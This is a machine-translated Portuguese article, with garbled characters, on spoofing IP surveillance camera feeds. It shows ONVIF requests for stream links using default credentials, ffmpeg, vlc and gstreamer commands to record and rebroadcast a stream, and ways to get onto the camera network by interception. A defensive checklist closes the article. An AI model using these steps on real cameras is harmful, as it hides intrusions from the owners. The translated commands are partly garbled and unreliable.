<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üì∑ üöõ ‚úÖ Hackeando c√¢meras de CFTV na pr√°tica üßíüèº üìâ üë®üèΩ‚Äçüè´</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Os f√£s do filme Onze Amigos de Ocean devem ter reconhecido o quadro que escolhemos para ilustrar este artigo. O momento em que os caras dur√µes habilme...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hackeando c√¢meras de CFTV na pr√°tica</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/devline/blog/405083/">  Os f√£s do filme Onze Amigos de Ocean devem ter reconhecido o quadro que escolhemos para ilustrar este artigo.  O momento em que os caras dur√µes habilmente substitu√≠ram o sinal anal√≥gico das c√¢meras de CFTV do cassino entrou na mente de muitos.  Alguns at√© tentam fazer isso na vida real. <br><br><img src="https://habrastorage.org/web/121/cd6/5f9/121cd65f9c634829977ee5eb5de23af4.jpg" alt="imagem"><br><br>  As tecnologias mudaram, agora as c√¢meras IP s√£o preferidas √†s anal√≥gicas; os m√©todos para quebr√°-las ser√£o discutidos em detalhes posteriormente. <br><br><h3>  Se voc√™ n√£o √© paran√≥ico, isso n√£o significa que voc√™ n√£o est√° sendo vigiado. </h3><br>  A maioria dos hackers faz isso por divers√£o ou para obter um pouco de fama na Internet.  Eles usam "buracos" conhecidos nos sistemas de suporte a c√¢meras e postam, em sua opini√£o, v√≠deos engra√ßados em recursos populares da Internet.  O YouTube est√° repleto de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">v√≠deos</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">semelhantes</a> . <br><br>  Consideraremos as conseq√º√™ncias mais graves da vulnerabilidade, a saber, quando o cracker n√£o se trai e sua penetra√ß√£o no sistema.  Esse ataque geralmente √© cuidadosamente planejado com anteced√™ncia, uma semana ou at√© um m√™s antes do hack. <br><br>  Como em nosso exemplo sobre os onze amigos da Ocean, falaremos sobre a substitui√ß√£o de um fluxo em sistemas de vigil√¢ncia por v√≠deo, n√£o apenas um sinal anal√≥gico, mas digital, ou seja, um fluxo RTSP. <br><a name="habracut"></a><br>  Como todas as informa√ß√µes neste artigo s√£o de natureza informativa e t√™m como objetivo principal eliminar erros de seguran√ßa ao criar um sistema de vigil√¢ncia por v√≠deo, n√£o recomendamos o uso da vulnerabilidade, que ser√° discutida mais adiante.  √â por isso que invadir a pr√≥pria rede de vigil√¢ncia por v√≠deo ser√° considerado superficialmente e os m√©todos descritos envolvem acesso aberto √† rede da empresa ou pessoa particular.  Lembre-se de que o acesso n√£o autorizado a dados pode ser processado. <br><br>  A experi√™ncia de nossa empresa mostra que o t√≥pico √© muito relevante, pois na fase de comissionamento de um sistema de vigil√¢ncia por v√≠deo, muitas pessoas conectam c√¢meras ao seu sistema usando links RTSP.  Para economizar tempo, por ignor√¢ncia ou por ter certeza de que √© necess√°rio, muitos nem pensam em alterar senhas ou em ver quais configura√ß√µes de seguran√ßa sua c√¢mera suporta. <br><br>  A prop√≥sito, o RTSP (Real Time Streaming Protocol) √© um protocolo que permite controlar o streaming de v√≠deo em tempo real.  Tudo o que precisamos saber √© que, com a ajuda do link RTSP, obteremos o fluxo de v√≠deo da c√¢mera. <br><br>  Finalmente, come√ßamos a <b>praticar</b> , a saber, o plano segundo o qual agiremos: <br><br>  1. Obtendo o link RTSP para a c√¢mera cujo fluxo queremos substituir. <br>  2. Preparando o arquivo de v√≠deo para transmiss√£o subsequente. <br>  3. Transmita o arquivo gravado. <br>  4. Prote√ß√£o contra troca de fluxo secund√°rio. <br><br><h3>  Obtendo o fluxo RTSP URI </h3><br>  Para substituir o sinal da c√¢mera, primeiro voc√™ precisa encontrar o fluxo de v√≠deo que precisamos.  Isso exigir√° um link para ele atrav√©s do protocolo RTSP.  A c√¢mera geralmente transmite v√°rias imagens (alta e baixa resolu√ß√£o).  O primeiro √© usado para grava√ß√£o e o segundo - para transmiss√£o em telas de vigil√¢ncia por v√≠deo.  A resolu√ß√£o m√≠nima (geralmente 320 por 240 pixels) reduz a carga no equipamento.  Para cada fluxo RTSP, o link geralmente √© distinguido por um d√≠gito na chave. <br><br>  C√¢meras diferentes podem ter links RTSP diferentes, mas a vis√£o geral √© aproximadamente a seguinte: <br>  <b>rtsp: // [login: senha @] endere√ßo IP: porta RTSP [/ key]</b> . <br><br>  A decodifica√ß√£o √© a seguinte: <br><br><ul><li>  login e senha - aqueles que s√£o usados ‚Äã‚Äãpara acessar a c√¢mera (podem n√£o ser); </li><li>  se o link contiver o nome de usu√°rio e a senha, o s√≠mbolo @ ser√° indicado ap√≥s eles para separar a autoriza√ß√£o e o endere√ßo IP; </li><li>  A porta RTSP atrav√©s da qual os comandos de controle de streaming de v√≠deo s√£o transmitidos √© 554 por padr√£o; </li><li>  a chave √© uma parte exclusiva do link RTSP, que pode variar dependendo do fabricante e modelo da c√¢mera, por exemplo: <br>  /? user = admin &amp; password = admin &amp; channel = number_number &amp; stream = stream_number.sdp <br>  /play1.sdp - em vez de "1", o n√∫mero do fluxo √© indicado; <br>  / live / ch00_0 00 - n√∫mero do canal, 0 - n√∫mero do fluxo; <br>  / channel1 - em vez de "1", o n√∫mero do fluxo √© indicado. </li></ul><br>  <b>Como descobrir um link RTSP sem ter acesso √† c√¢mera?</b>  Algumas maneiras simples: <br><br>  1. Encontre o link no site do fabricante da c√¢mera. <br>  2. Pesquise na Internet sites que forne√ßam links para diferentes modelos de c√¢mera, um exemplo desses sites <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br>  3. Baixe o manual do usu√°rio no site do fabricante e encontre as informa√ß√µes necess√°rias. <br><br>  Nos casos em que nenhum dos m√©todos simples ajudou, h√° um pouco mais complicado.  Aqui ser√° necess√°rio pelo menos acesso √† rede em que a c√¢mera est√° localizada.  Como a maioria das c√¢meras modernas suporta ONVIF, podemos descobrir o link RTSP usando este protocolo. <br>  Para fazer isso, envie v√°rias solicita√ß√µes sem autoriza√ß√£o ou com autoriza√ß√£o na c√¢mera proposta por padr√£o, por exemplo, ‚Äúadmin: admin‚Äù ou ‚Äúadmin: 12345‚Äù.  Ali√°s, na pr√°tica, havia c√¢meras que tinham um filtro de endere√ßo IP v√°lido e um login e senha n√£o padr√£o, mas devido a erros no firmware ao acessar via protocolo ONVIF, nem a autoriza√ß√£o nem o filtro foram verificados. <br><br>  <b>Como obter o link desejado para os dois fluxos da c√¢mera via protocolo ONVIF?</b> <br><br><div class="spoiler">  <b class="spoiler_title">1. Usando o comando GetProfiles, descobrimos o nome do perfil cuja uri precisamos</b> <div class="spoiler_text"><pre> POST / onvif / media_service HTTP / 1.1
 Anfitri√£o: 192.168.1.77
 Agente do Usu√°rio: gSOAP / 2.8
 Tipo de Conte√∫do: application / soap + xml;  charset = utf-8;  action = "http://www.onvif.org/ver10/media/wsdl/GetProfiles"
 Comprimento do conte√∫do: 2120
 Conex√£o: keep-alive
 SOAPAction: "http://www.onvif.org/ver10/media/wsdl/GetProfiles"<font></font>
<font></font>
 &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;SOAP-ENV: xmlns de envelope: SOAP-ENV = "http://www.w3.org/2003/05/soap-envelope"
                    .
                    Pule a descri√ß√£o de todo o espa√ßo para nome.
                    .
                    xmlns: trt = "http://www.onvif.org/ver10/media/wsdl"&gt;
     &lt;SOAP-ENV: cabe√ßalho&gt; &lt;/ SOAP-ENV: cabe√ßalho&gt;
     &lt;SOAP-ENV: Corpo&gt;
         &lt;trt: GetProfiles /&gt;
     &lt;/ SOAP-ENV: Corpo&gt;
 &lt;/ SOAP-ENV: Envelope&gt;
</pre><br></div></div><br><div class="spoiler">  <b class="spoiler_title">2. Na resposta longa recebida, encontramos uma linha com o nome do primeiro e do segundo perfil</b> <div class="spoiler_text"><pre> HTTP / 1.1 200 OK
 Servidor: gSOAP / 2.8
 Tipo de Conte√∫do: application / soap + xml;  charset = utf-8;  action = "http://www.onvif.org/ver10/media/wsdl/GetProfiles"
 Comprimento do conte√∫do: 17405
 Conex√£o: fechar<font></font>
<font></font>
 &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;SOAP-ENV: xmlns de envelope: SOAP-ENV = "http://www.w3.org/2003/05/soap-envelope"
                    .
                    Pule a descri√ß√£o de todo o espa√ßo para nome.
                    .
                    xmlns: tns1 = "http://www.onvif.org/ver10/topics"&gt;
     &lt;SOAP-ENV: cabe√ßalho&gt; &lt;/ SOAP-ENV: cabe√ßalho&gt;
     &lt;SOAP-ENV: Corpo&gt;
         &lt;trt: GetProfilesResponse&gt;
             &lt;trt: Perfis corrigidos = token "true" = "profile_cam1_stream1"&gt;
                 &lt;tt: Nome&gt; profile_cam1_stream1 &lt;/ tt: Nome&gt;
                 &lt;tt: VideoSourceConfiguration token = "videosource_config_cam1"&gt;
                     &lt;tt: Name&gt; videosource_config_cam1 &lt;/ tt: Name&gt;
                     .
                     Ignorar descri√ß√£o do perfil.
                     .
             &lt;/ trt: perfis&gt;
             &lt;trt: Perfis corrigidos = token "true" = "profile_cam1_stream2"&gt;
                 &lt;tt: Nome&gt; profile_cam1_stream2 &lt;/ tt: Nome&gt;
                 .
                 Ignoramos a descri√ß√£o do segundo perfil.
                 .
             &lt;/ trt: perfis&gt;
             .
             N√£o consideramos o terceiro perfil.
             .
         &lt;/ trt: GetProfilesResponse&gt;
     &lt;/ SOAP-ENV: Corpo&gt;
 &lt;/ SOAP-ENV: Envelope&gt;<font></font>
<font></font>
 - profile_cam1_stream1 √© o nome do primeiro perfil na c√¢mera.
 - profile_cam1_stream2 √© o nome do segundo perfil na c√¢mera.
</pre><br></div></div><br><div class="spoiler">  <b class="spoiler_title">3. Agora voc√™ precisa solicitar a url rtsp para esses perfis usando o comando GetStreamUri, especificando o perfil desejado no campo ProfileToken</b> <div class="spoiler_text"><pre> Exemplo para o primeiro encadeamento:<font></font>
<font></font>
 POST / onvif / media_service HTTP / 1.1
 Anfitri√£o: 192.168.1.77
 Agente do Usu√°rio: gSOAP / 2.8
 Tipo de Conte√∫do: application / soap + xml;  charset = utf-8;  action = "http://www.onvif.org/ver10/media/wsdl/GetStreamUri"
 Comprimento do conte√∫do: 2479
 Conex√£o: keep-alive
 SOAPAction: "http://www.onvif.org/ver10/media/wsdl/GetStreamUri"<font></font>
<font></font>
 &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;SOAP-ENV: xmlns de envelope: SOAP-ENV = "http://www.w3.org/2003/05/soap-envelope"
                    .
                    Pule a descri√ß√£o de todo o espa√ßo para nome.
                    .
                    xmlns: trt = "http://www.onvif.org/ver10/media/wsdl"&gt;
     &lt;SOAP-ENV: cabe√ßalho&gt; &lt;/ SOAP-ENV: cabe√ßalho&gt;
     &lt;SOAP-ENV: Corpo&gt;
         &lt;trt: GetStreamUri&gt;
             &lt;trt: StreamSetup xsi: type = "tt: StreamSetup"&gt;
                 &lt;tt: Stream xsi: type = "tt: StreamType"&gt; RTP-Unicast &lt;/ tt: Stream&gt;
                 &lt;tt: Transporte xsi: type = "tt: Transporte"&gt;
                     &lt;tt: Protocolo xsi: type = "tt: TransportProtocol"&gt; UDP &lt;/ tt: Protocolo&gt;
                 &lt;/ tt: Transporte&gt;
             &lt;/ trt: StreamSetup&gt;
             &lt;trt: ProfileToken xsi: type = "tt: ReferenceToken"&gt; profile_cam1_stream1 &lt;/ trt: ProfileToken&gt;
         &lt;/ trt: GetStreamUri&gt;
     &lt;/ SOAP-ENV: Corpo&gt;
 &lt;/ SOAP-ENV: Envelope&gt;<font></font>
<font></font>
 Em resposta, obtemos o link necess√°rio:<font></font>
<font></font>
 HTTP / 1.1 200 OK
 Servidor: gSOAP / 2.8
 Tipo de Conte√∫do: application / soap + xml;  charset = utf-8;  action = "http://www.onvif.org/ver10/media/wsdl/GetStreamUri"
 Comprimento do conte√∫do: 3701
 Conex√£o: fechar<font></font>
<font></font>
 &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;SOAP-ENV: xmlns de envelope: SOAP-ENV = "http://www.w3.org/2003/05/soap-envelope"
                    .
                    Pule a descri√ß√£o de todo o espa√ßo para nome.
                    .
                    xmlns: tns1 = "http://www.onvif.org/ver10/topics"&gt;
     &lt;SOAP-ENV: cabe√ßalho&gt; &lt;/ SOAP-ENV: cabe√ßalho&gt;
     &lt;SOAP-ENV: Corpo&gt;
         &lt;trt: GetStreamUriResponse&gt;
             &lt;trt: MediaUri&gt;
                 &lt;tt: Uri&gt; rtsp: //192.168.1.77: 554 / snl / live / 1/1 &lt;/ tt: Uri&gt;
                 &lt;tt: InvalidAfterConnect&gt; false &lt;/ tt: InvalidAfterConnect&gt;
                 &lt;tt: InvalidAfterReboot&gt; false &lt;/ tt: InvalidAfterReboot&gt;
                 &lt;tt: Tempo limite&gt; PT0S &lt;/ tt: Tempo limite&gt;
             &lt;/ trt: MediaUri&gt;
         &lt;/ trt: GetStreamUriResponse&gt;
     &lt;/ SOAP-ENV: Corpo&gt;
 &lt;/ SOAP-ENV: Envelope&gt;<font></font>
<font></font>
 Fazemos o mesmo para o segundo stream e obtemos o link:
 &lt;tt: Uri&gt; rtsp: //192.168.1.77: 554 / snl / live / 1/2 &lt;/ tt: Uri&gt;
</pre><br></div></div><br><h3>  Gravar fluxo RTSP no arquivo </h3><br>  Quando obtivemos os links rtsp necess√°rios, precisamos gravar uma transmiss√£o de v√≠deo com dura√ß√£o de v√°rias horas.  N√£o se esque√ßa que o dual-threading √© usado em sistemas modernos, portanto, voc√™ precisa gravar os dois fluxos ao mesmo tempo. <br><br>  Voc√™ pode gravar um fluxo de v√≠deo usando o protocolo RTSP usando v√°rios softwares.  Considere os mais populares: <b>ffmpeg, gstreamer e vlc</b> . <br><br><div class="spoiler">  <b class="spoiler_title">1. Fluxo de grava√ß√£o via ffmpeg</b> <div class="spoiler_text"><pre> $ man ffmpeg
 Estamos interessados ‚Äã‚Äãem:
 - vcodec copy - copia v√≠deo para arquivo;
 - c√≥pia acodec - copiar √°udio para um arquivo;
 - rtsp_transport tcp - sele√ß√£o de um m√©todo para transmitir um fluxo;
 - 25 - definir a taxa de quadros por segundo;
 - copyts - c√≥pia de timestamps;
 - start_at_zero - copia carimbos de data e hora a partir de 00: 00: 00: 000<font></font>
<font></font>
 Substitu√≠mos nosso link RTSP e, por meio de c√≥pia, especificamos o caminho e o nome do arquivo para o qual o registro ir√°
 % ffmpeg -i rtsp: //192.168.1.77: 554 / snl / live / 1/1 -copyts -start_at_zero -rtsp_transport tcp -r 25 -vcodec copy -acodec copy /home/line/example/1.avi
</pre><br><img src="https://habrastorage.org/web/6a1/d19/f7f/6a1d19f7fe8b4153823d0307adccf174.png" alt="imagem"><br><br>  A grava√ß√£o em um arquivo foi iniciada. <br></div></div><br><div class="spoiler">  <b class="spoiler_title">2. Grava√ß√£o via vlc</b> <div class="spoiler_text"><pre> Voc√™ pode se familiarizar com o conjunto de comandos que o vlc media player nos oferece usando o comando
 $ vlc ‚Äìh.<font></font>
<font></font>
 Estamos interessados ‚Äã‚Äãem:
 - sout = # file {path} - aponte para o arquivo no qual queremos copiar o v√≠deo;
 - rtsp-tcp - recebe rtsp por tcp;
 - rtsp-frame-buffer-size = 1000 - buffer para que o v√≠deo n√£o se desfa√ßa durante a reprodu√ß√£o;
 - h264-fps = 25 - complemento para 25 quadros.<font></font>
<font></font>
 Substitua nossos dados e execute
 $ cvlc rtsp: //192.168.1.77: 554 / snl / live / 1/1 --rtsp-tcp --rtsp-frame-buffer-size = 1000 --h264-fps = 25: sout = # file {dst = /home/line/example/1.avi}.<font></font>
<font></font>
 A janela vlc ser√° aberta e a grava√ß√£o ser√° iniciada; quando voc√™ fechar a janela, a grava√ß√£o ser√° interrompida.
</pre><br></div></div><br><div class="spoiler">  <b class="spoiler_title">3. Grava√ß√£o atrav√©s do gstreamer</b> <div class="spoiler_text"><pre> Informa√ß√µes sobre como trabalhar com o gstreamer podem ser encontradas &lt;a href="https://gstreamer.freedesktop.org/documentation/plugins.html"&gt; aqui &lt;/a&gt;.
 - rtspsrc location = "rtsp: //192.168.1.91: 554 / cam / realmonitor? Canal = 1 &amp; subtipo = 0 &amp; unicast = true &amp; proto = Onvif" - especifique o fluxo RTSP como uma fonte de dados.
 - rtph264depay - no v√≠deo RTSP ocorre em peda√ßos pequenos (pacotes rtp), atrav√©s do rtph264depay, receberemos o v√≠deo desses pacotes.
 - h264parse - como o nome indica, analise o fluxo H.264.
 - avimux - colete o fluxo no avi, voc√™ tamb√©m pode usar mp4mux ou matroskamux (mkv).
 - localiza√ß√£o do arquivo = 1.avi - especifique o arquivo no qual o v√≠deo ser√° salvo.<font></font>
<font></font>
 gst-launch-1.0 -v rtspsrc location = "rtsp: //192.168.1.91: 554 / cam / realmonitor? channel = 1 &amp; subttype = 0 &amp; unicast = true &amp; proto = Onvif"!  rtph264depay!  h264parse!  mp4mux!  local do arquivo = 1.mp4
</pre><br><img src="https://habrastorage.org/web/032/b02/115/032b021155034149bc35e8068548d5eb.png" alt="imagem"><br></div></div><br><h3>  Transmitir fluxo RTSP de um arquivo </h3><br>  √â hora de come√ßar a transmitir o arquivo gravado no formato RTSP.  Para fazer isso, usaremos todos os mesmos programas discutidos na se√ß√£o acima. <br><br>  1. Para transmitir um fluxo de v√≠deo da c√¢mera usando ffmpeg, voc√™ deve usar ffserver.  Sua descri√ß√£o pode ser encontrada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> .  Para definir os par√¢metros de convers√£o, √© necess√°rio <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">preencher o arquivo</a> ffserver.conf. <br><br><div class="spoiler">  <b class="spoiler_title">ffserver</b> <div class="spoiler_text"><pre> Arquivo Ffserver.conf
 RTSPPort - defina o n√∫mero da porta rtsp pela qual a transmiss√£o passar√°.
 &lt;Stream snl / live / 1/1&gt; - ap√≥s o Stream, definimos a chave necess√°ria.
 Formato rtp - formato de transmiss√£o.
 O arquivo "/home/line/example/1.avi" - rtsp_transport tcp - especifique o caminho para o arquivo que voc√™ deseja transferir e a chave para transferir via tcp.
 NoAudio - n√£o transmite som.<font></font>
<font></font>
 Arquivo Ffserver.conf<font></font>
<font></font>
 RTSPPort 554<font></font>
<font></font>
 &lt;Transmiss√£o snl / live / 1/1&gt;
 Formatar rtp
 Arquivo "/home/line/example/1.avi" -rtsp_transport tcp
 NoAudio 
 &lt;/Stream&gt;
 Em seguida, execute% ffserver -f ffserver.conf.
</pre><br><img src="https://habrastorage.org/web/bff/0c4/0bb/bff0c40bb4b5431fb1b564ed19d442c7.png" alt="imagem"><br></div></div><br>  2. Agora vamos usar o vlc-media player.  Apesar do fato de ser a maneira mais f√°cil, infelizmente, o vlc pode transmitir um fluxo apenas pelo UDP. <br><br><div class="spoiler">  <b class="spoiler_title">vlc media player</b> <div class="spoiler_text"><pre> Comando para iniciar o fluxo rtsp:
 - sout = # rtp {sdp = rtsp: //192.168.1.232: 554 / snl / live / 1/1} - defina o link pelo qual a transmiss√£o ocorrer√°.
 - repetir - se necess√°rio, configure o v√≠deo para reproduzir repetidamente.
 vlc /home/line/example/1.avi --sout = # rtp {sdp = rtsp: //192.168.1.232: 554 / snl / live / 1/1} - repetir
</pre><br></div></div><br>  3. Finalmente, usando o gst-server. <br><br><div class="spoiler">  <b class="spoiler_title">gst-server</b> <div class="spoiler_text"><pre> Primeiro voc√™ precisa instal√°-lo.
 $ sudo apt-get install gstreamer1.0
 $ wget https://gstreamer.freedesktop.org/src/gst-rtsp-server/gst-rtsp-server-1.8.3.tar.xz
 /gst-rtsp-server-1.8.3$ sudo apt install gtk-doc-tools
 /gst-rtsp-server-1.8.3$ sudo apt-get install libgstreamer-plugins-base1.0-dev
 /gst-rtsp-server-1.8.3$ make
 Agora podemos mudar o arquivo /gst-rtsp-server-1.8.3/examples/test-launch.c
 Aqui voc√™ pode alterar a porta RTSP padr√£o
 #define DEFAULT_RTSP_PORT "8554"
 e a chave est√° no link
 gst_rtsp_mount_points_add_factory (montagens, "/ test", f√°brica).
 Depois de substituir nossos valores, faremos.
 Agora execute o arquivo de inicializa√ß√£o de teste com as chaves.
 - rtspsrc location = "/ home / line / example / 1.avi" - o caminho para o arquivo que reproduziremos.
 - Codificador H264 - codifique em h.264.
 - rtph264pay name = pay0 pt = 96 - divida nosso fluxo em partes.
 $ ~ / gst-rtsp-server-1.8.3 / examples $ ./test-launch "(localiza√ß√£o do rtspsrc =" / home / linha / exemplo / 1.avi "! x264enc! nome do rtph264pay = pay0 pt = 96)"
</pre><br></div></div><br>  O arquivo gravado √© transmitido no formato RTSP, ap√≥s o qual resolvemos o problema de falha da c√¢mera.  Abaixo est√£o algumas op√ß√µes que variam dependendo do objeto que queremos atacar.  De fato, existem muitas outras maneiras, considere apenas as mais b√°sicas.  A primeira coisa que precisamos √© entrar na rede que precisamos. <br><br>  Se o objeto √© grande no territ√≥rio, muitas vezes h√° a oportunidade de abordar fisicamente algumas c√¢meras e at√© tentar encontrar o equipamento de comuta√ß√£o ao qual a c√¢mera est√° conectada. <br><br>  Se o objeto for pequeno, tente entrar na rede via wi-fi e digitaliz√°-lo usando o nmap, por exemplo. <br><br>  Al√©m disso, se houver acesso f√≠sico √† c√¢mera, voc√™ poder√° invadi-la em v√°rias etapas usando um computador de placa √∫nica: <br><br>  1) habilitar a grava√ß√£o wireshark; <br>  2) desconecte brevemente o fio da c√¢mera e conecte-o a uma √∫nica placa; <br>  3) retorne o cabo ao seu lugar; <br>  4) estude os logs recebidos. <br><br>  Ou, se voc√™ tiver acesso √† rede, poder√° usar o m√©todo de substitui√ß√£o cl√°ssico: <br><br>  - usando uma base de sustenta√ß√£o entre a c√¢mera e o servidor; <br>  - use ip_forward para encaminhar solicita√ß√µes do servidor de vigil√¢ncia para a c√¢mera IP e vice-versa; <br>  - o uso do iptables redireciona todas as solicita√ß√µes via porta RTSP para o servidor de vigil√¢ncia, n√£o da c√¢mera, mas da nossa m√°quina. <br><br><h3>  Hackeando c√¢meras de seguran√ßa </h3><br>  Para se proteger da falsifica√ß√£o de linhas de acordo com o procedimento descrito acima, v√°rios m√©todos podem ser usados: <br><br>  <b>1. Integra√ß√£o de c√¢mera</b> <br>  A maior prote√ß√£o √© fornecida pela integra√ß√£o da c√¢mera em um produto de software.  Verifique se a sua c√¢mera est√° integrada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ao sistema de vigil√¢ncia de linha</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br>  Se sua c√¢mera ou fabricante n√£o estiver listado, voc√™ pode entrar em contato com o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">suporte t√©cnico</a> com uma solicita√ß√£o para integrar seu modelo de c√¢mera IP. <br><br>  <b>2. Atualiza√ß√£o de firmware</b> <br>  √â necess√°rio manter constantemente o firmware da c√¢mera atualizado, pois com a ajuda de atualiza√ß√µes, os desenvolvedores corrigem v√°rias vulnerabilidades e, assim, aumentam a estabilidade das c√¢meras. <br><br>  <b>3. Altera√ß√£o de logins e senhas padr√£o</b> <br>  A primeira coisa que um invasor faz √© tentar usar o nome de usu√°rio e a senha padr√£o da c√¢mera.  Eles s√£o indicados nas instru√ß√µes de uso, portanto, n√£o √© dif√≠cil encontr√°-los.  Portanto, sempre use um nome de usu√°rio e senha exclusivos. <br><br>  <b>4. Habilitando a autoriza√ß√£o obrigat√≥ria</b> <br>  Esse recurso est√° presente em muitas c√¢meras modernas, mas, infelizmente, nem todos os usu√°rios sabem disso.  Se voc√™ desabilitar essa op√ß√£o, a c√¢mera n√£o solicitar√° autoriza√ß√£o quando estiver conectada, o que a tornar√° vulner√°vel a hackers.  Vale ressaltar que existem c√¢meras com autoriza√ß√£o dupla para acesso http e para acesso atrav√©s do protocolo ONVIF.  Al√©m disso, em algumas c√¢meras, h√° uma configura√ß√£o separada para solicita√ß√£o de autoriza√ß√£o ao conectar-se atrav√©s de um link RTSP direto. <br><br>  <b>5. filtro de endere√ßo IP</b> <br>  Se a c√¢mera suportar a fun√ß√£o da chamada lista branca, √© melhor n√£o negligenci√°-la.  Com sua ajuda, √© determinado o endere√ßo IP a partir do qual voc√™ pode se conectar √† c√¢mera.  Esse deve ser o endere√ßo do servidor ao qual a c√¢mera est√° conectada e, se necess√°rio, o segundo endere√ßo IP da esta√ß√£o de trabalho a partir da qual a configura√ß√£o √© feita.  Mas esse n√£o √© o m√©todo mais confi√°vel, pois um invasor pode usar o mesmo endere√ßo IP ao substituir um dispositivo.  Portanto, √© melhor usar esta op√ß√£o junto com outras recomenda√ß√µes. <br><br>  <b>6. prote√ß√£o de rede</b> <br>  √â necess√°rio configurar corretamente o equipamento de comuta√ß√£o.  A maioria dos switches agora oferece suporte √† prote√ß√£o contra falsifica√ß√£o de arp - certifique-se de usar isso. <br><br>  <b>7. compartilhamento de rede</b> <br>  Voc√™ deve prestar aten√ß√£o especial a este item, pois isso desempenha um papel importante na seguran√ßa do seu sistema.  A separa√ß√£o da rede corporativa e da rede de vigil√¢ncia o proteger√° contra invasores ou mesmo de seus pr√≥prios funcion√°rios que t√™m acesso √† rede compartilhada e desejam invadir voc√™. <br><br>  <b>8. Ligar o menu OSD</b> <br>  Voc√™ deve ativar o menu OSD com a hora e a data atuais na c√¢mera para poder sempre verificar a relev√¢ncia da imagem.  Essa √© uma boa maneira de se proteger contra a altera√ß√£o da grava√ß√£o, j√° que o OSD √© sobreposto a todo o v√≠deo proveniente de uma c√¢mera espec√≠fica.  Mesmo quando um invasor anota o fluxo RTSP, a falsifica√ß√£o ser√° notada gra√ßas aos dados que ainda permanecer√£o nos quadros de v√≠deo. <br><br>  Infelizmente, muitos invasores aprenderam a encontrar e tirar vantagem rapidamente das vulnerabilidades nos sistemas de vigil√¢ncia por v√≠deo IP.  Para proteger a rede, √© necess√°rio familiarizar-se com os m√©todos de prote√ß√£o descritos neste artigo.  Reserve tempo suficiente para o comissionamento do sistema e, em particular, para configurar corretamente todos os seus componentes.  Assim, voc√™ pode fornecer √† rede seguran√ßa m√°xima contra hackers. <br><br>  <b>Concluindo, sugerimos que voc√™ compartilhe nos coment√°rios, como voc√™ abordaria a prote√ß√£o da sua rede de vigil√¢ncia por v√≠deo contra hackers?</b>  <b>Quais m√©todos de ataque voc√™ considera os mais perigosos?</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt405083/">https://habr.com/ru/post/pt405083/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt405073/index.html">Data Center para a Copa do Mundo</a></li>
<li><a href="../pt405075/index.html">Enviando e recebendo mensagens SMS usando os gateways OpenVox VoIP</a></li>
<li><a href="../pt405077/index.html">Monitoramento de temperatura do or√ßamento: Arduino + Zabbix</a></li>
<li><a href="../pt405079/index.html">Calif√≥rnia paga estados vizinhos para pegar excesso de eletricidade de usinas de energia solar</a></li>
<li><a href="../pt405081/index.html">[CASE] Como fizemos uma c√≥pia da Trabalhadora e da Fazenda Coletiva para o Museu do Parlamento Europeu</a></li>
